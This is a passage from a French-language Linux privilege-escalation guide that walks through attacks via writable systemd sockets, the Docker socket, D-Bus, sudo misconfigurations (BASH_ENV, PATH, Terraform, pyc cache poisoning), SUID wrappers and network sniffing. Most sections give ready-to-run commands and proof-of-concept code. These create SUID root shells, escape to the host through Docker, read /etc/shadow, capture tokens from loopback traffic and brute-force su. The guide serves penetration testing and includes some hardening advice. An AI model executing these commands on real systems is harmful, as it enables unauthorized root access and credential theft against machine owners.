- Trouver une unité systemd qui **exécute un chemin relatif** et sur laquelle vous disposez de **privilèges d’écriture** via le **PATH de systemd** (pour usurper l’identité de cet exécutable)

**Pour en savoir plus sur les timers, consultez `man systemd.timer`.**

### **Activation du Timer**

Pour activer un timer, vous devez disposer des privilèges root et exécuter :
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Notez que le **timer** est **activé** en créant un lien symbolique vers celui-ci dans `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Les Unix Domain Sockets (UDS) permettent la **communication entre processus** sur la même machine ou sur des machines différentes dans le cadre de modèles client-serveur. Ils utilisent des fichiers descripteurs Unix standard pour la communication entre ordinateurs et sont configurés via des fichiers `.socket`.

Les Sockets peuvent être configurés à l'aide de fichiers `.socket`.

**Pour en savoir plus sur les Sockets, consultez `man systemd.socket`.** Plusieurs paramètres intéressants peuvent être configurés dans ce fichier :

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction` : ces options sont différentes, mais un résumé est utilisé pour **indiquer où le Socket va écouter** (le chemin du fichier Socket AF_UNIX, l'adresse IPv4/6 et/ou le numéro de port à écouter, etc.)
- `Accept` : accepte un argument booléen. Si la valeur est **true**, une **instance de service est créée pour chaque connexion entrante** et seul le Socket de connexion lui est transmis. Si la valeur est **false**, tous les Sockets d'écoute eux-mêmes sont **transmis à l'unité de service démarrée**, et une seule unité de service est créée pour toutes les connexions. Cette valeur est ignorée pour les Sockets datagram et les FIFO, où une seule unité de service traite inconditionnellement tout le trafic entrant. **La valeur par défaut est false**. Pour des raisons de performance, il est recommandé d'écrire les nouveaux daemons uniquement d'une manière compatible avec `Accept=no`.
- `ExecStartPre`, `ExecStartPost` : acceptent une ou plusieurs lignes de commande, qui sont **exécutées avant** ou **après** la **création** et la liaison des **Sockets**/FIFO d'écoute, respectivement. Le premier élément de la ligne de commande doit être un nom de fichier absolu, suivi des arguments du processus.
- `ExecStopPre`, `ExecStopPost` : **commandes** supplémentaires qui sont **exécutées avant** ou **après** la **fermeture** et la suppression des **Sockets**/FIFO d'écoute, respectivement.
- `Service` : indique le nom de l'unité de **service** à **activer** lors du **trafic entrant**. Ce paramètre n'est autorisé que pour les Sockets avec `Accept=no`. Par défaut, il s'agit du service portant le même nom que le Socket (avec le suffixe remplacé). Dans la plupart des cas, cette option ne devrait pas être nécessaire.

### Fichiers .socket inscriptibles

Si vous trouvez un fichier `.socket` **inscriptible**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor`, et la backdoor sera exécutée avant la création du Socket. Vous devrez donc **probablement attendre le redémarrage de la machine.**\
_Notez que le système doit utiliser la configuration de ce fichier Socket, sinon la backdoor ne sera pas exécutée_

### Activation d'un Socket + chemin d'unité inscriptible (création d'un service manquant)

Une autre mauvaise configuration à fort impact est la suivante :

- une unité Socket avec `Accept=no` et `Service=<name>.service`
- l'unité de service référencée est absente
- un attaquant peut écrire dans `/etc/systemd/system` (ou dans un autre chemin de recherche d'unités)

Dans ce cas, l'attaquant peut créer `<name>.service`, puis déclencher du trafic vers le Socket afin que systemd charge et exécute le nouveau service avec les privilèges root.

Flux rapide :
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets accessibles en écriture

Si vous **identifiez un socket accessible en écriture** (_nous parlons ici de Unix Sockets et non des fichiers de configuration `.socket`_), vous pouvez **communiquer** avec ce socket et éventuellement exploiter une vulnérabilité.

### Énumérer les Unix Sockets
```bash
netstat -a -p --unix
```
### Connexion brute
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exemple d'exploitation :**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### Sockets HTTP

Notez qu'il peut y avoir des **sockets à l'écoute de requêtes HTTP** (_je ne parle pas des fichiers .socket, mais des fichiers servant de sockets Unix_). Vous pouvez vérifier cela avec :
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Si le socket **répond avec une requête HTTP**, vous pouvez **communiquer** avec lui et peut-être **exploiter une vulnérabilité**.

### Writable Docker Socket

Le socket Docker, souvent situé à `/var/run/docker.sock`, est un fichier critique qui doit être sécurisé. Par défaut, il est accessible en écriture par l’utilisateur `root` et les membres du groupe `docker`. Disposer d’un accès en écriture à ce socket peut entraîner une élévation de privilèges. Voici une explication de la manière de procéder, ainsi que des méthodes alternatives si la Docker CLI n’est pas disponible.

#### **Privilege Escalation with Docker CLI**

Si vous disposez d’un accès en écriture au socket Docker, vous pouvez effectuer une élévation de privilèges à l’aide des commandes suivantes :
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ces commandes permettent d’exécuter un conteneur avec un accès root au système de fichiers de l’hôte.

#### **Utiliser directement l’API Docker**

Lorsque la Docker CLI n’est pas disponible, il est toujours possible d’abuser du socket Docker en utilisant des requêtes HTTP brutes via le socket Unix. Le flux le plus fiable est le suivant :

- créer un conteneur auxiliaire à longue durée avec la racine de l’hôte montée par bind
- le démarrer
- créer une instance `exec` à l’intérieur de ce conteneur auxiliaire
- démarrer l’instance `exec` et relire la sortie via l’API

**Lister les images Docker**
```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```
**Créer et démarrer un conteneur auxiliaire**
```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
"http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
-X POST "http://localhost/v1.47/containers/${HELPER}/start"
```
**Créer une instance exec**
```bash
EXEC_ID=$(
curl -s --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
"http://localhost/v1.47/containers/${HELPER}/exec" \
| tr -d '\n' \
| sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```
**Démarrez l'instance exec et lisez la sortie**
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Detach":false,"Tty":true}' \
"http://localhost/v1.47/exec/${EXEC_ID}/start"
```
Ce modèle est généralement plus robuste que d'essayer de piloter `attach` manuellement avec `socat` ou `nc -U`. Une fois que vous pouvez créer un helper avec `/:/host`, vous pouvez utiliser des instances `exec` supplémentaires pour lire des fichiers tels que `/host/root/...`, ajouter des clés SSH dans `/host/root/.ssh` ou modifier les fichiers de démarrage de l'hôte.

### Autres

Notez que si vous disposez des permissions d'écriture sur le socket Docker parce que vous êtes **dans le groupe `docker`**, vous disposez de [**davantage de moyens d'élever vos privilèges**](../../user-information/interesting-groups-linux-pe/index.html#docker-group). Si l'[**API Docker écoute sur un port**](../../../network-services-pentesting/2375-pentesting-docker.md#compromising), vous pouvez également être en mesure de la compromettre.

Consultez **d'autres moyens de sortir des containers ou d'abuser des container runtimes pour élever vos privilèges** ici :


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Élévation de privilèges avec Containerd (ctr)

Si vous découvrez que vous pouvez utiliser la commande **`ctr`**, consultez la page suivante, car **vous pourriez être en mesure d'en abuser pour élever vos privilèges** :


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## Élévation de privilèges avec **RunC**

Si vous découvrez que vous pouvez utiliser la commande **`runc`**, consultez la page suivante, car **vous pourriez être en mesure d'en abuser pour élever vos privilèges** :


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus est un **système de communication inter-processus (IPC)** sophistiqué qui permet aux applications d'interagir efficacement et de partager des données. Conçu pour les systèmes Linux modernes, il fournit un framework robuste pour différentes formes de communication entre applications.

Le système est polyvalent et prend en charge un IPC de base qui améliore l'échange de données entre les processus, rappelant les **sockets de domaine UNIX améliorés**. Il permet également de diffuser des événements ou des signaux, favorisant une intégration fluide entre les composants du système. Par exemple, un signal provenant d'un daemon Bluetooth indiquant un appel entrant peut inviter un lecteur de musique à se mettre en sourdine, améliorant ainsi l'expérience utilisateur. En outre, D-Bus prend en charge un système d'objets distants, simplifiant les demandes de services et les appels de méthodes entre les applications, et rationalisant des processus qui étaient traditionnellement complexes.

D-Bus fonctionne selon un **modèle d'autorisation allow/deny**, qui gère les permissions des messages (appels de méthodes, émissions de signaux, etc.) en fonction de l'effet cumulatif des règles de politique correspondantes. Ces politiques définissent les interactions avec le bus et peuvent permettre une élévation de privilèges par l'exploitation de ces permissions.

Un exemple d'une telle politique dans `/etc/dbus-1/system.d/wpa_supplicant.conf` est fourni. Elle détaille les permissions permettant à l'utilisateur root de posséder, d'envoyer et de recevoir des messages de `fi.w1.wpa_supplicant1`.

Les politiques auxquelles aucun utilisateur ou groupe n'est spécifié s'appliquent universellement, tandis que les politiques du contexte « default » s'appliquent à tous les éléments qui ne sont pas couverts par d'autres politiques spécifiques.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Découvrez comment énumérer et exploiter une communication D-Bus ici :**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Réseau**

Il est toujours intéressant d'énumérer le réseau et de déterminer la position de la machine.

### Énumération générique
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Triage rapide du filtrage sortant

Si l’hôte peut exécuter des commandes mais que les callbacks échouent, distinguez rapidement le filtrage DNS, du transport, du proxy et du routage :
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Ports ouverts

Vérifiez toujours les services réseau exécutés sur la machine avec lesquels vous n'avez pas pu interagir auparavant, avant d'y accéder :
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Classifiez les listeners selon leur adresse de bind :

- `0.0.0.0` / `[::]` : exposés sur toutes les interfaces locales.
- `127.0.0.1` / `::1` : accessibles uniquement en local (bons candidats pour un tunnel/forward).
- Adresses IP internes spécifiques (par exemple `10.x`, `172.16/12`, `192.168.x`, `fe80::`) : généralement accessibles uniquement depuis les segments internes.

### Processus de triage des services accessibles uniquement en local

Lorsque vous compromettez un host, les services liés à `127.0.0.1` deviennent souvent accessibles pour la première fois depuis votre shell. Un workflow local rapide consiste à :
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS comme scanner réseau (mode réseau uniquement)

En plus des vérifications locales d’escalade de privilèges, linPEAS peut fonctionner comme un scanner réseau ciblé. Il utilise les binaires disponibles dans `$PATH` (généralement `fping`, `ping`, `nc`, `ncat`) et n’installe aucun outil.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Si vous passez `-d`, `-p` ou `-i` sans `-t`, linPEAS se comporte comme un scanner réseau pur (en ignorant le reste des contrôles d'escalade de privilèges).

### Sniffing

Vérifiez si vous pouvez sniffer le trafic. Si c'est possible, vous pourriez être en mesure de récupérer des identifiants.
```
timeout 1 tcpdump
```
Vérifications pratiques rapides :
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
L’interface loopback (`lo`) est particulièrement précieuse en post-exploitation, car de nombreux services internes uniquement y exposent des tokens/cookies/credentials :
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
Capturer maintenant, analyser plus tard:
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Utilisateurs

### Énumération générique

Vérifiez **qui** vous êtes, quels **privilèges** vous avez, quels **utilisateurs** sont présents sur les systèmes, lesquels peuvent effectuer un **login** et lesquels disposent de **privilèges root** :
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Certaines versions de Linux étaient affectées par un bug permettant aux utilisateurs avec un **UID > INT_MAX** d'effectuer une privilege escalation. Plus d'informations : [ici](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ici](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [ici](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploitez-le** avec : **`systemd-run -t /bin/bash`**

### Groupes

Vérifiez si vous êtes **membre d'un groupe** susceptible de vous accorder des privilèges root :


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Presse-papiers

Vérifiez si quelque chose d'intéressant se trouve dans le presse-papiers (si possible)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politique de mots de passe
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Mots de passe connus

Si vous **connaissez un mot de passe** de l’environnement, **essayez de vous connecter en tant que chaque utilisateur** avec ce mot de passe.

### Su Brute

Si cela ne vous dérange pas de générer beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l’ordinateur, vous pouvez essayer de brute-force un utilisateur avec [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie également de brute-force les utilisateurs.

## Exploitation des PATH accessibles en écriture

### $PATH

Si vous découvrez que vous pouvez **écrire dans un dossier du $PATH**, vous pourrez peut-être escalader vos privilèges en **créant une backdoor dans le dossier accessible en écriture**, avec le nom d’une commande qui sera exécutée par un autre utilisateur (idéalement root) et qui **n’est pas chargée depuis un dossier situé avant** votre dossier accessible en écriture dans le $PATH.

### SUDO et SUID

Vous pouvez être autorisé à exécuter certaines commandes avec sudo, ou celles-ci peuvent avoir le bit suid. Vérifiez-le avec :
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Certaines **commandes inattendues permettent de lire et/ou d’écrire des fichiers, voire d’exécuter une commande.** Par exemple :
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

La configuration de Sudo peut permettre à un utilisateur d’exécuter certaines commandes avec les privilèges d’un autre utilisateur sans connaître le mot de passe.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Dans cet exemple, l'utilisateur `demo` peut exécuter `vim` en tant que `root`. Il est alors trivial d'obtenir un shell en ajoutant une clé SSH dans le répertoire root ou en appelant `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Cette directive permet à l'utilisateur de **définir une variable d'environnement** lors de l'exécution de quelque chose :
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Cet exemple, **basé sur la machine HTB Admirer**, était **vulnérable** au **PYTHONPATH hijacking** permettant de charger une bibliothèque Python arbitraire lors de l’exécution du script en tant que root :
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Empoisonnement de `__pycache__` / `.pyc` inscriptible dans les imports Python autorisés par sudo

Si un **script Python autorisé par sudo** importe un module dont le répertoire du package contient un **`__pycache__` inscriptible**, vous pouvez peut-être remplacer le `.pyc` mis en cache et obtenir une exécution de code en tant qu’utilisateur privilégié lors de l’import suivant.

- Pourquoi cela fonctionne :
- CPython stocke les caches de bytecode dans `__pycache__/module.cpython-<ver>.pyc`.
- L’interpréteur valide l’**en-tête** (magic + métadonnées d’horodatage/hash liées à la source), puis exécute l’objet de code marshalé stocké après cet en-tête.
- Si vous pouvez **supprimer et recréer** le fichier mis en cache parce que le répertoire est inscriptible, un `.pyc` appartenant à root mais non inscriptible peut tout de même être remplacé.
- Chemin typique :
- `sudo -l` affiche un script ou wrapper Python que vous pouvez exécuter en tant que root.
- Ce script importe un module local depuis `/opt/app/`, `/usr/local/lib/...`, etc.
- Le répertoire `__pycache__` du module importé est inscriptible par votre utilisateur ou par tout le monde.

Énumération rapide :
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
Si vous pouvez inspecter le script privilégié, identifiez les modules importés et leur chemin de cache :
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
Workflow d'exploitation :

1. Exécutez une fois le script autorisé par sudo afin que Python crée le fichier cache légitime s'il n'existe pas déjà.
2. Lisez les 16 premiers octets du fichier `.pyc` légitime et réutilisez-les dans le fichier empoisonné.
3. Compilez un code object contenant un payload, utilisez `marshal.dumps(...)` dessus, supprimez le fichier cache original, puis recréez-le avec l'en-tête original suivi de votre bytecode malveillant.
4. Réexécutez le script autorisé par sudo afin que l'import exécute votre payload en tant que root.

Notes importantes :

- La réutilisation de l'en-tête original est essentielle, car Python vérifie les métadonnées du cache par rapport au fichier source, et non si le corps du bytecode correspond réellement au source.
- Cette technique est particulièrement utile lorsque le fichier source appartient à root et n'est pas accessible en écriture, mais que le répertoire `__pycache__` qui le contient l'est.
- L'attaque échoue si le processus privilégié utilise `PYTHONDONTWRITEBYTECODE=1`, effectue des imports depuis un emplacement doté de permissions sûres ou supprime l'accès en écriture de chaque répertoire du chemin d'importation.

Structure minimale de proof-of-concept :
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
Durcissement :

- Vérifiez qu’aucun répertoire du chemin d’import Python privilégié n’est accessible en écriture par des utilisateurs faiblement privilégiés, y compris `__pycache__`.
- Pour les exécutions privilégiées, envisagez `PYTHONDONTWRITEBYTECODE=1` ainsi que des vérifications périodiques des répertoires `__pycache__` accessibles en écriture de manière inattendue.
- Traitez les modules Python locaux accessibles en écriture et les répertoires de cache accessibles en écriture de la même manière que les scripts shell ou les bibliothèques partagées accessibles en écriture et exécutés par root.

### BASH_ENV preserved via sudo env_keep → root shell

Si sudoers conserve `BASH_ENV` (par exemple, `Defaults env_keep+="ENV BASH_ENV"`), vous pouvez exploiter le comportement de démarrage non interactif de Bash pour exécuter du code arbitraire en tant que root lors de l’invocation d’une commande autorisée.

- Pourquoi cela fonctionne : pour les shells non interactifs, Bash évalue `$BASH_ENV` et source ce fichier avant d’exécuter le script cible. De nombreuses règles sudo autorisent l’exécution d’un script ou d’un shell wrapper. Si `BASH_ENV` est conservé par sudo, votre fichier est sourcé avec les privilèges root.

- Requirements:
- Une règle sudo que vous pouvez exécuter (toute cible qui invoque `/bin/bash` de manière non interactive, ou tout script bash).
- `BASH_ENV` présent dans `env_keep` (vérifiez avec `sudo -l`).

- PoC :
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Durcissement :
- Supprimer `BASH_ENV` (et `ENV`) de `env_keep`, préférer `env_reset`.
- Éviter les shell wrappers pour les commandes autorisées via sudo ; utiliser des binaires minimaux.
- Envisager la journalisation des entrées/sorties de sudo et des alertes lorsque des variables d'environnement préservées sont utilisées.

### Terraform via sudo avec HOME préservé (!env_reset)

Si sudo laisse l'environnement intact (`!env_reset`) tout en autorisant `terraform apply`, `$HOME` reste celui de l'utilisateur appelant. Terraform charge donc **$HOME/.terraformrc** en tant que root et respecte `provider_installation.dev_overrides`.

- Pointer le provider requis vers un répertoire accessible en écriture et y déposer un plugin malveillant portant le nom du provider (par exemple, `terraform-provider-examples`) :
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform échouera lors de la négociation du plugin Go, mais exécutera la charge utile en tant que root avant de se terminer, laissant derrière lui un shell SUID.

### Contournement de validation via symlink

Les variables Terraform peuvent être fournies via des variables d’environnement `TF_VAR_<name>`, qui persistent lorsque sudo conserve l’environnement. Les validations faibles telles que `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` peuvent être contournées avec des symlinks :
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform résout le lien symbolique et copie le véritable fichier `/root/root.txt` vers une destination lisible par l’attaquant. La même approche peut être utilisée pour **écrire** dans des chemins privilégiés en créant au préalable des liens symboliques de destination (par exemple, en faisant pointer le chemin de destination du provider vers un emplacement à l’intérieur de `/etc/cron.d/`).

### requiretty / !requiretty

Sur certaines distributions plus anciennes, sudo peut être configuré avec `requiretty`, ce qui force sudo à être exécuté uniquement depuis un TTY interactif. Si `!requiretty` est défini (ou si l’option est absente), sudo peut être exécuté depuis des contextes non interactifs tels que des reverse shells, des tâches cron ou des scripts.
```bash
Defaults !requiretty
```
Ce n’est pas une vulnérabilité directe en soi, mais cela élargit les situations dans lesquelles les règles sudo peuvent être exploitées sans nécessiter un PTY complet.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Si `sudo -l` affiche `env_keep+=PATH` ou un `secure_path` contenant des entrées accessibles en écriture par l’attaquant (par exemple, `/home/<user>/bin`), toute commande relative exécutée dans la cible autorisée par sudo peut être détournée.

- Prérequis : une règle sudo (souvent `NOPASSWD`) exécutant un script/binaire qui appelle des commandes sans chemins absolus (`free`, `df`, `ps`, etc.) et une entrée PATH accessible en écriture qui est recherchée en premier.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Contournement des chemins lors de l'exécution via Sudo
**Jump** pour lire d'autres fichiers ou utiliser des **symlinks**. Par exemple, dans le fichier sudoers : _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Si un **wildcard** est utilisé (\*), c'est encore plus simple :
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contre-mesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Commande Sudo/binaire SUID sans chemin de commande

Si la **permission sudo** est accordée pour une seule commande **sans spécifier le chemin** : _hacker10 ALL= (root) less_, vous pouvez l'exploiter en modifiant la variable PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Cette technique peut également être utilisée si un **suid** **binaire exécute une autre commande sans en spécifier le chemin (vérifiez toujours avec** _**strings**_ **le contenu d’un binaire SUID inhabituel)**.

[Exemples de payloads à exécuter.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### Binaire SUID avec chemin de commande

Si le **suid** **binaire exécute une autre commande en spécifiant son chemin**, vous pouvez essayer **d’exporter une fonction** portant le nom de la commande appelée par le fichier suid.

Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, vous devez essayer de créer la fonction et de l’exporter :
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Ensuite, lorsque vous appelez le binaire suid, cette fonction sera exécutée

### Script accessible en écriture exécuté par un wrapper SUID

Une mauvaise configuration courante d’une custom-app est un wrapper binaire SUID appartenant à root qui exécute un script, alors que le script lui-même est accessible en écriture par des utilisateurs à faibles privilèges.

Modèle typique :
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Si `/usr/local/bin/backup.sh` est accessible en écriture, vous pouvez ajouter des commandes de payload, puis exécuter le wrapper SUID :
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Vérifications rapides :
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Ce chemin d'attaque est particulièrement courant dans les wrappers de "maintenance"/"backup" fournis dans `/usr/local/bin`.

